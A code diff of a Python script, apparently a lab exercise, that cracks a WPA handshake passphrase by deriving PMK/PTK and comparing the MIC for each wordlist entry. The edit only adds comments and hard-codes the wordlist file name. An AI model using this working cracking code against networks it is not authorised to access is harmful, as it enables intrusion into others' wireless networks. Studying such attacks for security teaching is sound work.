@@ -20,7 +20,6 @@ from hashlib import sha1
 from binascii import a2b_hex
 from scapy.all import rdpcap, Dot11Beacon, Dot11, EAPOL, raw
 from tqdm import tqdm
-from sys import argv
 
 
 def customPRF512(key, A, B):
@@ -53,19 +52,31 @@ data[17:]   = [0]*82
 data        = bytes(data)
 
 
-# Function used to check candidate key
 def check(k):
+    """
+    Computes the PMK then PTK based on a guessed key
+    Then computes the corresponding MIC to compare it with the known one
+    """
     k = str.encode(k)
+    
+    # Compute PMK and PTK
     pmk = pbkdf2(sha1, k, ssid, 4096, 32)
     ptk = customPRF512(pmk, str.encode(A), B)
+    
+    # Compute the corresponding MIC
     guess_mic = hmac.new(ptk[:16], data, sha1)
+
+    # Compare it with the target
     return guess_mic.digest()[:16] == target_mic
 
 
 # Use wordlist to attack the MIC
-num_lines = sum(1 for line in open(argv[1]))
+# Count lines in file
+num_lines = sum(1 for line in open("wordlist.txt"))
 print(f"Line count in wordlist : {num_lines}")
-with open(argv[1], 'r') as file:
+
+# Uses wordlist to crack the password
+with open("wordlist.txt", 'r') as file:
     for key in tqdm(file, total=num_lines):
         if check(key.strip()):
             print(f"Key found ! It's {key.strip()}")
